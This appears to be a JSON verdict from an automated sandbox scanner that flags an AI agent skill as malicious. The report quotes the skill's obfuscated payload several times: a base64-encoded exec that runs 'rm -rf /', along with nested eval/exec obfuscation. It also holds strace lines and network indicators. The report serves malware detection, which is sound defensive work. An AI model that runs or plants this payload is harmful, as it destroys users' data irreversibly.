@@ -1,0 +1,232 @@
+{
+  "status": "ok",
+  "outdir": "workshop_malicious_output_final/batch_detect_malicious/Charpup-skill-security-auditor-obfuscation-skill",
+  "skill_name": "Charpup-skill-security-auditor-obfuscation-skill",
+  "documented_purpose": "Dynamic analysis of installed agent skill based on observed runtime behavior",
+  "verdict": "malicious",
+  "score": 97.0,
+  "score_scale": "0-100",
+  "confidence": "high",
+  "num_patterns": 3,
+  "num_raw_patterns": 3,
+  "num_executed_patterns": 0,
+  "num_intent_only_patterns": 3,
+  "num_executed_malicious_patterns": 0,
+  "num_high_executed_patterns": 0,
+  "num_medium_executed_patterns": 0,
+  "num_strong_intent_patterns": 2,
+  "num_supporting_intent_patterns": 1,
+  "binary_mode": true,
+  "malicious_threshold": 80.0,
+  "suspicious_threshold": 40.0,
+  "aggregation_formula": "min(100, max(S) + 0.1 * sum(S_except_max)); high-risk executed evidence is >=100, strong blocked intent is >=85, weak/supporting-only evidence is capped at 60, and noise-only evidence is capped at 30",
+  "severity_weights": {
+    "low": 40,
+    "medium": 70,
+    "high": 100
+  },
+  "reason": "Dynamic risk score 97.0 exceeded the malicious threshold 80.0.",
+  "network_indicators": {
+    "contacted_domains": [
+      "api.anthropic.com",
+      "http-intake.logs.us5.datadoghq.com"
+    ],
+    "contacted_ips": [
+      "172.17.0.2",
+      "169.254.169.254",
+      "160.79.104.10",
+      "34.149.66.137"
+    ],
+    "contacted_urls": [],
+    "embedded_urls": []
+  },
+  "execution_indicators": {
+    "command_patterns": [
+      "ls -la (skill directory)",
+      "mkdir -p /home/appuser/workdir",
+      "python3 base64.b64decode(...) — decode-only, no exec, to reveal payload contents",
+      "python3 ast.parse(...) — static AST scan for dangerous calls, no execution",
+      "43    execve(\"/usr/bin/id\", [\"id\", \"-u\"], 0x5b733ee68110 /* 22 vars */) = 0",
+      "44    execve(\"/usr/bin/cat\", [\"cat\", \"/tmp/user_prompt.txt\"], 0x5b733ee6d8d0 /* 22 vars */) = 0",
+      "56    execve(\"/usr/bin/git\", [\"/usr/bin/git\", \"config\", \"--get\", \"remote.origin.url\"], 0x2c3bdf74510 /* 28 vars */) = 0",
+      "59    execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"rg\", \"--version\"], 0x2c3be18c640 /* 24 vars */) = 0",
+      "60    execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"rg\", \"--no-config\", \"--files\", \"--hidden\", \"--no-ignore\", \"--max-depth\", \"4\", \"--glob\", \".orphaned_at\", \"/home/appuser/.claude/plugins/cache\"], 0x2c3bdf76c10 /* 28 vars */) = 0",
+      "61    execve(\"/bin/sh\", [\"/bin/sh\", \"-c\", \"ps aux | grep -E \\\"code|cursor|windsurf|devin-desktop|idea|pycharm|webstorm|phpstorm|rubymine|clion|goland|rider|datagrip|dataspell|aqua|gateway|fleet|android-studio\\\" | grep -v grep\"], 0x2c3beb11f90 /* 29 vars */) = 0",
+      "64    execve(\"/usr/bin/grep\", [\"grep\", \"-v\", \"grep\"], 0x5a2116adfc68 /* 29 vars */) = 0",
+      "63    execve(\"/usr/bin/grep\", [\"grep\", \"-E\", \"code|cursor|windsurf|devin-desktop|idea|pycharm|webstorm|phpstorm|rubymine|clion|goland|rider|datagrip|dataspell|aqua|gateway|fleet|android-studio\"], 0x5a2116adfd18 /* 29 vars */ <unfinished ...>",
+      "62    execve(\"/usr/bin/ps\", [\"ps\", \"aux\"], 0x5a2116adfc38 /* 29 vars */ <unfinished ...>",
+      "66    execve(\"/bin/zsh\", [\"/bin/zsh\", \"--version\"], 0x2c3beb13110 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "67    execve(\"/usr/bin/zsh\", [\"/usr/bin/zsh\", \"--version\"], 0x2c3beb12d90 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "68    execve(\"/usr/local/bin/zsh\", [\"/usr/local/bin/zsh\", \"--version\"], 0x2c3beb12690 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "69    execve(\"/opt/homebrew/bin/zsh\", [\"/opt/homebrew/bin/zsh\", \"--version\"], 0x2c3beb12a10 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "70    execve(\"/bin/bash\", [\"/bin/bash\", \"-c\", \"env\"], 0x2c3beb12a10 /* 32 vars */) = 0",
+      "70    execve(\"/usr/bin/env\", [\"env\"], 0x5cbd3de3e790 /* 32 vars */ <unfinished ...>",
+      "72    execve(\"/usr/bin/id\", [\"id\", \"-u\"], 0x615daf564c00 /* 31 vars */) = 0",
+      "74    execve(\"/usr/bin/cut\", [\"cut\", \"-d \", \"-f3\"], 0x615daf56c820 /* 31 vars */) = 0",
+      "75    execve(\"/usr/bin/grep\", [\"grep\", \"-vE\", \"^_[^_]\"], 0x615daf56c820 /* 31 vars */) = 0",
+      "78    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x615daf56c820 /* 31 vars */ <unfinished ...>",
+      "80    execve(\"/usr/bin/grep\", [\"grep\", \"on\"], 0x615daf56c820 /* 31 vars */ <unfinished ...>",
+      "81    execve(\"/usr/bin/awk\", [\"awk\", \"{print \\\"set -o \\\" $1}\"], 0x615daf56c820 /* 31 vars */ <unfinished ...>",
+      "82    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x615daf56c820 /* 31 vars */ <unfinished ...>",
+      "84    execve(\"/usr/bin/sed\", [\"sed\", \"s/^alias //g\"], 0x615daf56c820 /* 31 vars */) = 0",
+      "86    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x615daf56c820 /* 31 vars */ <unfinished ...>",
+      "85    execve(\"/usr/bin/sed\", [\"sed\", \"s/^/alias -- /\"], 0x615daf56c820 /* 31 vars */ <unfinished ...>",
+      "87    execve(\"/usr/bin/cat\", [\"cat\"], 0x615daf56c820 /* 31 vars */) = 0",
+      "88    execve(\"/usr/bin/cat\", [\"cat\"], 0x615daf56c820 /* 31 vars */) = 0",
+      "89    execve(\"/usr/bin/cat\", [\"cat\"], 0x615daf56c820 /* 31 vars */) = 0",
+      "92    execve(\"/usr/bin/ls\", [\"ls\", \"-la\", \"/home/appuser/.claude/skills/Charpup-skill-security-auditor-obfuscation-skill/\"], 0x57a89a239100 /* 34 vars */) = 0",
+      "95    execve(\"/usr/bin/mkdir\", [\"mkdir\", \"-p\", \"/home/appuser/workdir\"], 0x590dcb289110 /* 34 vars */) = 0",
+      "96    execve(\"/usr/bin/ls\", [\"ls\", \"-la\", \"/home/appuser/workdir\"], 0x590dcb289110 /* 34 vars */) = 0",
+      "99    execve(\"/usr/local/bin/python3\", [\"python3\", \"-\"], 0x60b5a30d80f0 /* 34 vars */) = 0",
+      "102   execve(\"/usr/local/bin/python3\", [\"python3\", \"-\"], 0x63a5dd822650 /* 34 vars */ <unfinished ...>"
+    ],
+    "execution_parents": [
+      "id",
+      "cat",
+      "git",
+      "claude.exe",
+      "sh",
+      "grep",
+      "ps",
+      "zsh",
+      "bash",
+      "env",
+      "cut",
+      "head",
+      "awk",
+      "sed",
+      "ls",
+      "mkdir",
+      "python3"
+    ],
+    "tool_call_patterns": [
+      "ls -la (skill directory)",
+      "mkdir -p /home/appuser/workdir",
+      "python3 base64.b64decode(...) — decode-only, no exec, to reveal payload contents",
+      "python3 ast.parse(...) — static AST scan for dangerous calls, no execution",
+      "{'command': 'exec(base64.b64decode(\\'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk=\\')) -> exec(\"import os; os.system(\\'rm -rf /\\')\") [TOOL.py:14-16, _obfuscated_function]', 'reason': 'irreversible destructive action — recursive filesystem deletion (rm -rf /)'}",
+      "{'command': \"eval('eval(__import__(\\\\'os\\\\'))') [TOOL.py:31, _layered_obfuscation]\", 'reason': 'unsafe dynamic code execution via obfuscated eval'}",
+      "{'command': 'exec(constructed_string) [TOOL.py:43, _string_manipulation]', 'reason': 'unsafe dynamic code execution of runtime-constructed string'}",
+      "{'command': 'import TOOL / python3 TOOL.py', 'reason': 'module contains malicious exec/eval payloads; not run to avoid any risk of detonation'}",
+      "exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk=')) -> exec(\"import os; os.system('rm -rf /')\") [TOOL.py:14-16, _obfuscated_function] | reason: irreversible destructive action — recursive filesystem deletion (rm -rf /)"
+    ]
+  },
+  "file_indicators": {
+    "bundled_files": [],
+    "dropped_files": [
+      "{'path': '/home/appuser/.claude/.last-cleanup', 'after': '-rw-r--r--\\t24\\t2026-06-17 07:54:19.7007142320\\t/home/appuser/.claude/.last-cleanup'}",
+      "{'path': '/home/appuser/.claude/backups', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:55:24.9037607190\\t/home/appuser/.claude/backups'}",
+      "{'path': '/home/appuser/.claude/backups/.claude.json.backup.1781682853934', 'after': '-rw-r--r--\\t33\\t2026-06-17 07:54:13.9351200770\\t/home/appuser/.claude/backups/.claude.json.backup.1781682853934'}",
+      "{'path': '/home/appuser/.claude/backups/.claude.json.backup.1781682924903', 'after': '-rw-r--r--\\t24323\\t2026-06-17 07:55:24.9037607190\\t/home/appuser/.claude/backups/.claude.json.backup.1781682924903'}",
+      "{'path': '/home/appuser/.claude/policy-limits.json', 'after': '-rw-------\\t359\\t2026-06-17 07:54:14.4967641240\\t/home/appuser/.claude/policy-limits.json'}",
+      "{'path': '/home/appuser/.claude/projects', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:54:14.7114786820\\t/home/appuser/.claude/projects'}",
+      "{'path': '/home/appuser/.claude/projects/-home-appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:54:19.6493493350\\t/home/appuser/.claude/projects/-home-appuser'}",
+      "{'path': '/home/appuser/.claude/projects/-home-appuser/81d172a8-d2eb-4638-b446-1b75a631d207.jsonl', 'after': '-rw-------\\t59210\\t2026-06-17 07:55:24.6087196850\\t/home/appuser/.claude/projects/-home-appuser/81d172a8-d2eb-4638-b446-1b75a631d207.jsonl'}",
+      "{'path': '/home/appuser/.claude/session-env', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:54:18.6265207090\\t/home/appuser/.claude/session-env'}",
+      "{'path': '/home/appuser/.claude/session-env/81d172a8-d2eb-4638-b446-1b75a631d207', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:54:18.6265207090\\t/home/appuser/.claude/session-env/81d172a8-d2eb-4638-b446-1b75a631d207'}",
+      "{'path': '/home/appuser/.claude/sessions', 'after': 'drwx------\\t4096\\t2026-06-17 07:55:24.5954698380\\t/home/appuser/.claude/sessions'}",
+      "{'path': '/home/appuser/.claude/shell-snapshots', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:55:24.5974699720\\t/home/appuser/.claude/shell-snapshots'}",
+      "{'path': '/tmp/claude-1000', 'after': 'drwx------\\t4096\\t2026-06-17 07:54:18.6390758280\\t/tmp/claude-1000'}",
+      "{'path': '/tmp/claude-1000/-home-appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:54:18.6395634020\\t/tmp/claude-1000/-home-appuser'}",
+      "{'path': '/tmp/claude-1000/-home-appuser/81d172a8-d2eb-4638-b446-1b75a631d207', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:54:18.6395634020\\t/tmp/claude-1000/-home-appuser/81d172a8-d2eb-4638-b446-1b75a631d207'}",
+      "{'path': '/tmp/claude-1000/-home-appuser/81d172a8-d2eb-4638-b446-1b75a631d207/tasks', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:54:54.2858338760\\t/tmp/claude-1000/-home-appuser/81d172a8-d2eb-4638-b446-1b75a631d207/tasks'}",
+      "{'path': '/tmp/fs_after.txt', 'after': '-rw-r--r--\\t0\\t2026-06-17 07:55:25.6145382470\\t/tmp/fs_after.txt'}",
+      "{'path': '/home/appuser', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 07:54:12.2326121330\\t/home/appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:55:24.9084908510\\t/home/appuser'}",
+      "{'path': '/home/appuser/.claude', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 07:54:12.2296119310\\t/home/appuser/.claude', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:54:19.7005658210\\t/home/appuser/.claude'}",
+      "{'path': '/home/appuser/.claude.json', 'before': '-rw-r--r--\\t33\\t2026-06-17 07:54:12.2326121330\\t/home/appuser/.claude.json', 'after': '-rw-r--r--\\t24406\\t2026-06-17 07:55:24.9044905820\\t/home/appuser/.claude.json'}",
+      "{'path': '/tmp', 'before': 'drwxrwxrwt\\t4096\\t2026-06-17 07:54:13.2696817510\\t/tmp', 'after': 'drwxrwxrwt\\t4096\\t2026-06-17 07:55:25.6145382470\\t/tmp'}",
+      "{'path': '/tmp/fs_before.txt', 'before': '-rw-r--r--\\t0\\t2026-06-17 07:54:13.2696817510\\t/tmp/fs_before.txt', 'after': '-rw-r--r--\\t1551\\t2026-06-17 07:54:13.2726819520\\t/tmp/fs_before.txt'}"
+    ],
+    "file_patterns": [
+      "46    openat(AT_FDCWD, \"/home/appuser/.claude/.credentials.json\", O_RDONLY|O_NOCTTY <unfinished ...>",
+      "/home/appuser/.claude/shell-snapshots"
+    ],
+    "certificate_fingerprints": []
+  },
+  "detected_malicious_patterns": [
+    {
+      "pattern": "command_injection_or_code_execution_intent",
+      "severity": "high",
+      "base_weight": 100,
+      "effective_score": 85.0,
+      "evidence_type": "strong_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "high",
+      "summary": "Skill contains command-injection, shell-execution, or RCE-style malicious primitive indicators.",
+      "evidence": {
+        "primitive_evidence": [
+          "exec(base64.b64decode('aw1wb3j0ig9zoybvcy5zexn0zw0oj3jtic1yziavjyk=')) -> exec(\"import os; os.system('rm -rf /')\") [tool.py:14-16, _obfuscated_function] eval('eval(__import__(\\'os\\'))') [tool.py:31, _layered_obfuscation] exec(constructed_str",
+          "tool.py exec(base64.b64decode('aw1wb3j0ig9zoybvcy5zexn0zw0oj3jtic1yziavjyk=')) -> exec(\"import os; os.system('rm -rf /')\") [tool.py:14-16, _obfuscated_function] destructive irreversible exec(base64.b64decode('aw1wb3j0ig9zoybvcy5zexn0zw0oj3jtic1yziav",
+          "versible exec(base64.b64decode('aw1wb3j0ig9zoybvcy5zexn0zw0oj3jtic1yziavjyk=')) -> exec(\"import os; os.system('rm -rf /')\") [tool.py:14-16, _obfuscated_function]",
+          "jtic1yziavjyk=')) -> exec(\"import os; os.system('rm -rf /')\") [tool.py:14-16, _obfuscated_function] eval('eval(__import__(\\'os\\'))') [tool.py:31, _layered_obfuscation] exec(constructed_string) [tool.py:43, _string_manipulation] import tool / python3 tool.py exec(base64.b64decode('aw1wb3j0ig9zoybvcy5zexn0zw0oj3jtic1yziavjyk=')) -> exec(\"import os; os.system('rm -rf /')\") [tool.py:14-16, _obfuscated_function] destructive irreversible exec(base64.b64decode('aw1wb3j0ig9zoybvcy5zexn0zw0oj3jtic1yziavjyk=')) -> exec(\"import os; os.system('rm -rf /')\") [tool.py:14-16, _obfuscated_function",
+          "------------------| | `_obfuscated_function` (l9) | base64-encoded payload → `exec()` | `import os; os.system('rm -rf /')` — **destructive recursive filesystem wipe** | | `_layered_obfuscation` (l18) | multi-layer base64 + char-concat → `eval()` | bu",
+          "mand\": \"exec(base64.b64decode('aw1wb3j0ig9zoybvcy5zexn0zw0oj3jtic1yziavjyk=')) -> exec(\\\"import os; os.system('rm -rf /')\\\") [tool.py:14-16, _obfuscated_function]\", \"reason\": \"irreversible destructive action — recursive filesystem deletion (rm"
+        ],
+        "commands_skipped": [
+          "exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk=')) -> exec(\"import os; os.system('rm -rf /')\") [TOOL.py:14-16, _obfuscated_function] | reason: irreversible destructive action — recursive filesystem deletion (rm -rf /)",
+          "eval('eval(__import__(\\'os\\'))') [TOOL.py:31, _layered_obfuscation] | reason: unsafe dynamic code execution via obfuscated eval",
+          "exec(constructed_string) [TOOL.py:43, _string_manipulation] | reason: unsafe dynamic code execution of runtime-constructed string",
+          "import TOOL / python3 TOOL.py | reason: module contains malicious exec/eval payloads; not run to avoid any risk of detonation"
+        ],
+        "skipped_unsafe_commands": [
+          "exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk=')) -> exec(\"import os; os.system('rm -rf /')\") [TOOL.py:14-16, _obfuscated_function] | reason: irreversible destructive action — recursive filesystem deletion (rm -rf /)"
+        ]
+      },
+      "evidence_short": "primitive=exec(base64.b64decode('aw1wb3j0ig9zoybvcy5zexn0zw0oj3jtic1yziavjyk=')) -> exec(\"import os; os.system('rm -rf /')\") [tool.py:14-16, _obfuscated_function] eval('eval(__import__(\\'...; command=exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk=')) -> exec(\"import os; os.system('rm -rf /')\") [TOOL.py:14-16, _obfuscated_function] | reason: irreversible d..."
+    },
+    {
+      "pattern": "unsafe_eval_exec_intent",
+      "severity": "high",
+      "base_weight": 100,
+      "effective_score": 85.0,
+      "evidence_type": "strong_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "high",
+      "summary": "Suspicious correlated behavior detected.",
+      "evidence": {
+        "source": "claude_output.txt",
+        "primitive_evidence": [
+          "code(...) — decode-only, no exec, to reveal payload contents\", \"python3 ast.parse(...) — static ast scan for dangerous calls, no execution\" ], \"commands_skipped\": [ { \"command\": \"exec(base64.b64decode('aw1wb3j0ig9zoybvcy5zexn0zw0oj3jtic1yziavjyk=')) -> exec(\\\"import os; os.system('rm -rf /')\\\") [tool.py:14-16, _obfuscated_function]\", \"reason\": \"irreversible destructive action — recursive",
+          "ely decoded all base64 / concatenated / reversed obfuscation layers without execution\", \"static ast scan enumerating dangerous calls (exec x2, eval, b64decode x2) and confirming no top-level invocation\" ], \"network_attempts\": [], \"missing_requirements\": [ \"none — skill defines"
+        ],
+        "commands_skipped": [
+          "exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk=')) -> exec(\"import os; os.system('rm -rf /')\") [TOOL.py:14-16, _obfuscated_function] | reason: irreversible destructive action — recursive filesystem deletion (rm -rf /)",
+          "eval('eval(__import__(\\'os\\'))') [TOOL.py:31, _layered_obfuscation] | reason: unsafe dynamic code execution via obfuscated eval",
+          "exec(constructed_string) [TOOL.py:43, _string_manipulation] | reason: unsafe dynamic code execution of runtime-constructed string",
+          "import TOOL / python3 TOOL.py | reason: module contains malicious exec/eval payloads; not run to avoid any risk of detonation"
+        ]
+      },
+      "evidence_short": "source=claude_output.txt"
+    },
+    {
+      "pattern": "unsafe_command_skipped",
+      "severity": "medium",
+      "base_weight": 70,
+      "effective_score": 35.0,
+      "evidence_type": "supporting_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "medium",
+      "summary": "Unsafe command was identified and skipped during safe sandbox execution.",
+      "evidence": {
+        "skipped_unsafe_commands": [
+          "exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk=')) -> exec(\"import os; os.system('rm -rf /')\") [TOOL.py:14-16, _obfuscated_function] | reason: irreversible destructive action — recursive filesystem deletion (rm -rf /)"
+        ],
+        "unsafe_command_instructions": [
+          "destructive",
+          "irreversible",
+          "exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk=')) -> exec(\"import os; os.system('rm -rf /')\") [TOOL.py:14-16, _obfuscated_function] | reason: irreversible destructive action — recursive filesystem deletion (rm -rf /)"
+        ]
+      },
+      "evidence_short": "skipped=exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk=')) -> exec(\"import os; os.system('rm -rf /')\") [TOOL.py:14-16, _obfuscated_function] | reason: irreversible d..."
+    }
+  ]
+}
